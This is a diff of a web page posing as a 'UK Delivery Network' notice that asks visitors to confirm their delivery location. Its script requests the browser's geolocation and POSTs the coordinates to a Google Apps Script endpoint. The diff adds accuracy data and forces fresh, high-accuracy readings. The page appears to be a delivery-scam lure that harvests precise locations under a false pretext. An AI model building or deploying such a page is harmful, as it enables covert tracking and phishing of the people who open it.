@@ -80,41 +80,53 @@ button:hover {
 
 </head>
 
+
 <body>
 
+
 <div class="card">
+
 
 <div class="logo">
 UK Delivery Network
 </div>
 
+
 <div class="tagline">
 Fast • Reliable • Professional Delivery
 </div>
+
 
 <h2>
 Confirm your delivery location
 </h2>
 
+
 <p>
 To help ensure your delivery arrives smoothly, please confirm your location.
 </p>
+
 
 <p>
 Your device will ask for permission. Your location is only used to complete this delivery.
 </p>
 
+
 <button onclick="getLocation()">
 📍 Show Delivery Location
 </button>
 
+
 <p id="status"></p>
+
 
 <div class="footer">
 UK Delivery Network © 2026
 </div>
 
+
 </div>
+
 
 
 <script>
@@ -123,41 +135,57 @@ function getLocation(){
 
 const status = document.getElementById("status");
 
+
 if(!navigator.geolocation){
 
-status.innerHTML="Location is not supported on this device.";
+status.innerHTML =
+"Location is not supported on this device.";
+
 return;
 
 }
 
-status.innerHTML="Requesting location...";
+
+status.innerHTML =
+"Requesting location...";
+
 
 
 navigator.geolocation.getCurrentPosition(
 
 function(position){
 
+
 const data = {
 
 latitude: position.coords.latitude,
 
-longitude: position.coords.longitude
+longitude: position.coords.longitude,
+
+accuracy: position.coords.accuracy
 
 };
 
 
-fetch("https://script.google.com/macros/s/AKfycbw7gL-hqKmdnxaiikqJsqQ8ECGpjLTlD3CSxjdC-DFdeyMH8atEjiOZ5q2PcZtPbMPX/exec",
+
+fetch(
+"https://script.google.com/macros/s/AKfycbw7gL-hqKmdnxaiikqJsqQ8ECGpjLTlD3CSxjdC-DFdeyMH8atEjiOZ5q2PcZtPbMPX/exec",
 {
 
 method:"POST",
 
 headers:{
+
 "Content-Type":"text/plain"
+
 },
 
 body:JSON.stringify(data)
 
-})
+}
+
+)
+
 
 
 .then(function(response){
@@ -167,33 +195,52 @@ return response.text();
 })
 
 
+
 .then(function(result){
 
 console.log(result);
 
-status.innerHTML="✓ Location received. Thank you.";
+status.innerHTML =
+"✓ Location received. Thank you.";
 
 })
+
 
 
 .catch(function(error){
 
 console.log(error);
 
-status.innerHTML="Unable to send location.";
+status.innerHTML =
+"Unable to send location.";
 
 });
 
 
 },
 
-function(){
 
-status.innerHTML="Location permission denied.";
+function(error){
+
+status.innerHTML =
+"Location permission denied.";
+
+},
+
+
+{
+
+enableHighAccuracy:true,
+
+timeout:10000,
+
+maximumAge:0
 
 }
 
+
 );
+
 
 }
 
